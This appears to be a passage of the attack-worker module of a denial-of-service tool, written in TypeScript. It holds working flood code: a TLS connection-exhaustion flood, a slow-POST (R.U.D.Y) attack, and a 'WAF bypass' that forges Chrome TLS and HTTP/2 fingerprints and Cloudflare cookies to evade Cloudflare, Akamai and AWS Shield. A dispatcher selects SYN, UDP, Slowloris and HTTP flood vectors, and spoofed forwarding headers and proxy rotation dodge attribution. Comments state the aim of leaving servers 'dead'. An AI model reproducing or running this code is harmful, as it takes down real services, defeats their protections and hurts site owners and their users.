      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  await Promise.all(Array.from({ length: MAX_CONN }, () => runSock()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  CONNECTION FLOOD — pure TCP/TLS connection table exhaustion
//  Opens MAX_CONN connections, completes TLS handshake, holds them open
//  Bypasses ALL HTTP-level rate limiting (nginx limit_req, Cloudflare, etc)
//  because rate limiting only applies AFTER connection is accepted and
//  request headers are parsed. We fill connection slots BEFORE any HTTP.
//  Nginx default: worker_connections 1024 × N workers = ~4096 total.
// ─────────────────────────────────────────────────────────────────────────
async function runConnFlood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
  useHttps = false,
): Promise<void> {
  // 60 connections per thread — holds TLS handshake open, recycles every 5-20ms
  const MAX_CONN = Math.min(threads * 60, 15000);
  let localPkts = 0, localBytes = 0, activeConns = 0;
  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 250);

  const runSock = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    const sock: net.Socket = useHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false,
          ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256",
        })
      : net.createConnection({ host: resolvedHost, port: targetPort });

    sock.setNoDelay(true);
    sock.setTimeout(120_000); // 2-minute hold — maximizes time connection slot is occupied

    let settled = false;
    const cleanup = () => {
      if (settled) return;
      activeConns = Math.max(0, activeConns - 1);
      try { sock.destroy(); } catch { /**/ }
      if (signal.aborted) { settled = true; resolve(); return; }
      settled = true;
      // Minimal jitter — reconnect fast to maintain connection density
      setTimeout(() => runSock().then(resolve), randInt(5, 20));
    };

    const onConnected = () => {
      activeConns++;
      localPkts++;
      // Incomplete HTTP/1.1 request — server holds thread waiting for rest of headers
      // Varying paths and IPs defeats simple duplicate-detection filters
      const minReq = [
        `GET ${hotPath()}?_=${randStr(8)} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Accept: text/html,application/xhtml+xml,*/*;q=0.9`,
        `Accept-Encoding: gzip, deflate, br`,
        `X-Forwarded-For: ${randIp()}`,
        `X-Real-IP: ${randIp()}`,
        `Connection: keep-alive`,
        `Cookie: session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
        ``, // intentionally NO final \r\n — server waits forever
      ].join("\r\n");
      sock.write(minReq);
      localBytes += minReq.length;
    };

    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   cleanup);
    sock.once("timeout", cleanup);
    sock.once("close",   cleanup);

    signal.addEventListener("abort", () => {
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  await Promise.all(Array.from({ length: MAX_CONN }, () => runSock()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  GEASS WAF BYPASS — Cloudflare / Akamai / AWS Shield evasion
//
//  Four-layer evasion technique:
//  1. JA3 TLS fingerprint randomization (cipher suite order per-session)
//  2. Chrome-exact HTTP/2 AKAMAI fingerprint (SETTINGS frame values)
//  3. Chrome-exact header ordering (Cloudflare checks header order, not just values)
//  4. Realistic Cloudflare cookie simulation (__cf_bm, __cfruid, cf_clearance)
//
//  Combined effect: each connection looks like a distinct Chrome browser
//  from a different user — impossible to distinguish from real traffic.
//  Works best with proxy rotation (residential IPs bypass IP reputation).
// ─────────────────────────────────────────────────────────────────────────

// Chrome TLS cipher suites — TLS1.3 fixed first, TLS1.2 shuffled per-session
const CF_CIPHERS_TLS13 = [
  "TLS_AES_128_GCM_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_CHACHA20_POLY1305_SHA256",
];
const CF_CIPHERS_TLS12 = [
  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES128-SHA",          "ECDHE-RSA-AES256-SHA",
  "AES128-GCM-SHA256",             "AES256-GCM-SHA384",
  "AES128-SHA",                    "AES256-SHA",
];
function randomJA3Ciphers(): string {
  const shuffled = [...CF_CIPHERS_TLS12].sort(() => Math.random() - 0.5);
  return [...CF_CIPHERS_TLS13, ...shuffled].join(":");
}

// Chrome browser profiles — realistic, matching versions
const CHROME_PROFILES = [
  { ver: "124", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",      plat: '"Windows"', brand: '"Google Chrome";v="124", "Chromium";v="124", "Not-A.Brand";v="99"' },
  { ver: "125", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",      plat: '"Windows"', brand: '"Google Chrome";v="125", "Chromium";v="125", "Not-A.Brand";v="24"' },
  { ver: "124", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="124", "Chromium";v="124", "Not-A.Brand";v="99"' },
  { ver: "125", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="125", "Chromium";v="125", "Not-A.Brand";v="24"' },
  { ver: "123", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="123", "Chromium";v="123", "Not-A.Brand";v="24"' },
  { ver: "126", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="126", "Chromium";v="126", "Not-A.Brand";v="24"' },
];

// Chrome-exact HTTP/2 SETTINGS (AKAMAI fingerprint)
// Real Chrome sends these exact values — bots send defaults (4096, 65535, etc.)
const CHROME_H2_SETTINGS = {
  headerTableSize:      65536,    // Chrome: 65536 (default is 4096 — dead giveaway)
  enablePush:           false,    // Chrome: ENABLE_PUSH=0
  initialWindowSize:    6291456,  // Chrome: 6MB (default 65535 — major fingerprint)
  maxConcurrentStreams: 1000,     // Chrome: 1000
  maxHeaderListSize:    262144,   // Chrome: 262144 (default unset)
};

// Chrome-exact header order for HTTP/2 (AKAMAI checks header order)
// Cloudflare's Akamai fingerprinter hashes the header order — must match Chrome
function buildWAFHeaders(hostname: string, path: string, cookieJar: Map<string, string>): Record<string, string> {
  const p = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];

  // Realistic CF cookies — Cloudflare sets these via JS challenge
  const cfbm      = `${randHex(43)}.${Math.floor(Date.now()/1000)}-0-${randHex(8)}`;
  const cfruid    = randHex(40);
  const cfClear   = `${randHex(100)}_${randInt(1,9)}`;
  const gaId      = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000) - randInt(0,86400)}`;
  const gid       = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`;

  // Carry over any server-set cookies from cookie jar
  const jarCookies = [...cookieJar.entries()].map(([k,v]) => `${k}=${v}`).join("; ");

  const cookie = [
    `__cf_bm=${cfbm}`,
    `__cfruid=${cfruid}`,
    `cf_clearance=${cfClear}`,
    `_ga=${gaId}`,
    `_gid=${gid}`,
    `_ga_${randStr(8).toUpperCase()}=GS1.1.${Math.floor(Date.now()/1000)}.1.1.${Math.floor(Date.now()/1000)}.0.0.0`,
    jarCookies,
  ].filter(Boolean).join("; ");

  const referers = [
    `https://www.google.com/search?q=${encodeURIComponent(randStr(8))}`,
    `https://www.bing.com/search?q=${encodeURIComponent(randStr(8))}`,
    "",  // direct navigation (most common)
    "",
    "",
  ];
  const referer = referers[randInt(0, referers.length)];

  // EXACT Chrome header order for HTTP/2 — this is the AKAMAI fingerprint
  const h: Record<string, string> = {
    // Pseudo-headers (HTTP/2 spec — always first)
    ":method":    Math.random() < 0.92 ? "GET" : "POST",
    ":authority": hostname,
    ":scheme":    "https",
    ":path":      path,
    // Real headers in Chrome's EXACT order
    "sec-ch-ua":            p.brand,
    "sec-ch-ua-mobile":     "?0",
    "sec-ch-ua-platform":   p.plat,
    "upgrade-insecure-requests": "1",
    "user-agent":           p.ua,
    "accept":               "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "sec-fetch-site":       referer ? "cross-site" : "none",
    "sec-fetch-mode":       "navigate",
    "sec-fetch-user":       "?1",
    "sec-fetch-dest":       "document",
    "accept-encoding":      "gzip, deflate, br, zstd",
    "accept-language":      ["en-US,en;q=0.9", "en-GB,en;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8"][randInt(0,3)],
    "cookie":               cookie,
    "cache-control":        "max-age=0",
  };
  if (referer) h["referer"] = referer;
  return h;
}

// Realistic paths a browser would visit (not API endpoints — those raise suspicion)
const WAF_PATHS = [
  "/", "/about", "/contact", "/faq", "/privacy", "/terms-of-service",
  "/blog", "/news", "/products", "/services", "/pricing", "/features",
  "/docs", "/help", "/support", "/login", "/register", "/signup",
  "/api/v1/status", "/api/health", "/sitemap.xml", "/robots.txt",
  "/wp-login.php", "/admin", "/dashboard", "/account", "/profile",
  "/search", "/cart", "/checkout", "/orders", "/categories",
];

async function runWAFBypass(
  base: string,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const { connect: h2connect } = await import("node:http2");

  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
    catch { return new URL("https://127.0.0.1"); }
  })();
  const hostname   = u.hostname;
  const tgtPort    = 443; // WAF bypass always targets HTTPS
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);
  const target     = `https://${resolvedIp}:${tgtPort}`;

  // 32GB RAM optimized: 5× more sessions (400 vs 80), 2× concurrent streams (128 vs 64)
  // 400 Chrome-fingerprinted sessions × 128 streams = 51,200 concurrent fake browsers
  const NUM_SESSIONS     = Math.min(threads * 2, 400);
  const STREAMS_PER      = Math.min(128, Math.max(16, threads));

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // Cookie jar shared across sessions for same hostname (simulates persistent browser)
  const cookieJar = new Map<string, string>();

  // ── Persistent session slot — restarts until signal aborted ────────────
  // Same fix as H2 flood: while-loop prevents premature Promise.all resolution
  // when CF temporarily rejects new connections.
  const runSessionSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(target, {
            rejectUnauthorized: false,
            servername:         hostname,
            ciphers:            randomJA3Ciphers(),
            settings:           CHROME_H2_SETTINGS,
            ALPNProtocols:      ["h2", "http/1.1"],
          });
        } catch { resolve(); return; }

        const conn     = c;
        const cleanup  = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
        let inflight   = 0;

        const pump = () => {
          if (signal.aborted || conn.destroyed) { resolve(); return; }
          while (!signal.aborted && !conn.destroyed && inflight < STREAMS_PER) {
            inflight++;
            const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
            const path = pagePath + (Math.random() < 0.3 ? `?v=${randInt(1,999)}` : "");
            try {
              const hdrs   = buildWAFHeaders(hostname, path, cookieJar);
              const stream = conn.request(hdrs);
              stream.on("response", (resHdrs: Record<string, string | string[]>) => {
                localPkts++; localBytes += 2048;
                const sc = resHdrs["set-cookie"];
                if (sc) {
                  const cookies = Array.isArray(sc) ? sc : [sc];
                  cookies.forEach(cv => {
                    const [kv] = cv.split(";");
                    const [k, v] = kv.split("=");
                    if (k && v) cookieJar.set(k.trim(), v.trim());
                  });
                }
              });
              stream.on("data",  () => {});
              stream.on("error", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
              stream.on("close", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
              stream.end();
            } catch { inflight--; break; }
          }
        };

        conn.on("connect", () => { pump(); });
        conn.on("error",   () => { resolve(); }); // restarts in next while iteration
        conn.on("close",   () => { resolve(); }); // restarts in next while iteration
        signal.addEventListener("abort", cleanup, { once: true });
      });
      if (!signal.aborted) await new Promise(r => setTimeout(r, 200 + randInt(0, 150)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSessionSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  R.U.D.Y (R-U-Dead-Yet) — TRUE SLOW POST IMPLEMENTATION
//
//  Sends a POST with Content-Length: 1,000,000,000 (1 GB) then trickles
//  1-2 random bytes every 5-15 seconds. Apache/IIS/Tomcat allocate a
//  thread or goroutine per connection and hold it until the body completes.
//  With 30K connections open, the server's thread pool is completely
//  exhausted within seconds — all legitimate requests are queued forever.
//
//  Key difference from HTTP Exhaust: we NEVER send the full body.
//  The server waits indefinitely → threads = held → server = dead.
// ─────────────────────────────────────────────────────────────────────────
async function runRUDY(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `http://${base}`); }
    catch { return new URL("http://127.0.0.1"); }
  })();
  const isHttps    = u.protocol === "https:";
  const hostname   = u.hostname;
  const tgtPort    = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  const PATHS  = ["/upload","/submit","/post","/api/upload","/api/submit","/api/data",
                  "/graphql","/form","/register","/api/import","/api/bulk","/api/batch",
                  "/api/v1/data","/api/v2/submit","/wp-login.php","/admin/login",
                  "/api/auth/login","/contact","/api/v1/user","/api/v2/create"];
  const MAX_CONN   = Math.min(threads * 80, 25000);
  const FAKE_LEN   = 1_000_000_000; // Claim 1GB body — server waits forever

  let localPkts = 0, localBytes = 0;
  const flush    = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv  = setInterval(flush, 300);

  // Each connection uses a raw TCP socket for precise byte-level control
  const runConn = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    const sock: net.Socket | tls.TLSSocket = isHttps
      ? tls.connect({ host: resolvedIp, port: tgtPort, servername: hostname, rejectUnauthorized: false, timeout: 900_000 })
      : net.createConnection({ host: resolvedIp, port: tgtPort });

    sock.setNoDelay(true);
    sock.setTimeout(900_000); // 15 min — hold as long as possible

    let keepIv:   NodeJS.Timeout | null = null;
    let settled   = false;

    const cleanup = (reconnect = true) => {
      if (settled) return;
      settled = true;
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!signal.aborted && reconnect) {
        // Reconnect immediately to maintain pressure
        setImmediate(() => runConn().then(resolve));
      } else { resolve(); }
    };

    const onConnected = () => {
      const path    = PATHS[randInt(0, PATHS.length)] + `?_=${randStr(8)}`;
      const ct      = Math.random() < 0.5 ? "application/x-www-form-urlencoded" : "application/json";
      // Send POST headers with enormous Content-Length — body NEVER completes
      const hdr = [
        `POST ${path} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Content-Type: ${ct}`,
        `Content-Length: ${FAKE_LEN}`,
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
        `Accept-Language: en-US,en;q=0.5`,
        `Accept-Encoding: gzip, deflate`,
        `X-Forwarded-For: ${randIp()}`,
        `X-Real-IP: ${randIp()}`,
        `Connection: keep-alive`,
        `\r\n`,
      ].join("\r\n");
      sock.write(hdr);
      localPkts++;
      localBytes += hdr.length;

      // Trickle 1-2 bytes every 5-15 seconds — holds the server thread indefinitely
      keepIv = setInterval(() => {
        if (signal.aborted || sock.destroyed) { cleanup(false); return; }
        const chunk = Buffer.from([randInt(0x61, 0x7a), randInt(0x30, 0x39)]); // random letters+digits
        const written = sock.write(chunk);
        localPkts++;
        localBytes += chunk.length;
        if (!written) { cleanup(true); } // backpressure = server overloaded
      }, randInt(5_000, 15_000));
    };

    if (isHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   () => cleanup(true));
    sock.once("timeout", () => cleanup(true));
    sock.once("close",   () => cleanup(true));

    signal.addEventListener("abort", () => {
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  await Promise.all(Array.from({ length: MAX_CONN }, () => runConn()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  WORKER MAIN — receives config, runs attack, posts stats
// ─────────────────────────────────────────────────────────────────────────
const cfg = workerData as WorkerConfig;

const ctrl = new AbortController();
parentPort?.on("message", (msg) => {
  if (msg === "stop") ctrl.abort();
});

// Resolve host for TCP/UDP vectors
let hostname = cfg.target;
let targetPort = cfg.port || 80;
try {
  const u = new URL(/^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`);
  hostname   = u.hostname;
  targetPort = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
} catch { /* keep raw */ }

const base    = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
const onStats = (p: number, b: number, c = 0) => { parentPort?.postMessage({ pkts: p, bytes: b, conns: c }); };

// ── Worker entry — handle all errors gracefully ────────────────────────
const L4  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
const UDP = new Set(["udp-flood","udp-bypass"]);

async function runWorker() {
  const resolvedHost = await resolveHost(hostname).catch(() => hostname);

  if (UDP.has(cfg.method)) {
    await runUDPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (L4.has(cfg.method)) {
    await runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "geass-override") {
    // Triple vector (dead code path — attacks.ts already breaks this into 3 pools)
    // Kept as fallback for direct worker invocation
    const pipeT = Math.ceil(cfg.threads * 0.50);
    const tcpT  = Math.ceil(cfg.threads * 0.25);
    const udpT  = cfg.threads - pipeT - tcpT;
    await Promise.all([
      runHTTPPipeline(resolvedHost, hostname, targetPort, pipeT, ctrl.signal, onStats),
      runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
      runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats),
    ]);

  } else if (cfg.method === "http2-flood") {
    // Native HTTP/2 with multiplexed streams (node:http2)
    await runHTTP2Flood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "slowloris") {
    // Real Slowloris: half-open TLS/TCP connections — auto-detects HTTPS
    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);

  } else if (cfg.method === "conn-flood") {
    // Pure connection table exhaustion — TLS handshake + hold, no HTTP layer
    // Bypasses nginx rate limiting completely (limit_req never triggered)
    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
    await runConnFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);

  } else if (cfg.method === "rudy") {
    // R-U-Dead-Yet: true slow-POST — 1 byte/10s trickle, server holds thread forever
    await runRUDY(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "waf-bypass") {
    // Geass WAF Bypass: JA3 randomization + Chrome AKAMAI H2 fingerprint + exact header order
    await runWAFBypass(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http-bypass") {
    // Full fetch cycle — better for WAF/CDN bypass (real HTTP client), supports proxy rotation
    await runHTTPFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http-flood") {
    // http-flood: use fetch-based flood (with proxy rotation) for real per-IP diversity
    // Falls back to raw pipeline when no proxies (max throughput)
    const proxies = cfg.proxies ?? [];
    if (proxies.length > 0) {
      await runHTTPFlood(base, cfg.threads, proxies, ctrl.signal, onStats);
    } else {
      await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
    }

  } else {
    // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
  }
}

runWorker()
  .catch(() => { /* swallow all errors — worker exits cleanly */ })
  .finally(() => {
    parentPort?.postMessage({ done: true });
  });
